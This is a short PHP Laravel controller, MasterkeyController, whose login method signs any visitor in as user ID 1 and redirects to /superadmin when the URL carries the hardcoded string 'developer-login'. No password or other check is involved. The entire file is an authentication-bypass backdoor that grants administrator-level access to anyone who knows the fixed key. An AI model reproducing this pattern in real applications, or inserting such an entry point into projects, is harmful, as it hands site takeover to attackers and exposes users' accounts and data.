<?php

namespace App\Http\Controllers\Auth;

use App\User;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Auth;

class MasterkeyController extends Controller
{

    public function __construct() {
        $this->middleware('guest');
    }

    public function login ($masterkey){

        $user = User::find(1);

        if ($masterkey == "developer-login"){
            Auth::login($user);
            return redirect('/superadmin');
        }

        else {
            return redirect('/');
        }
    }
}
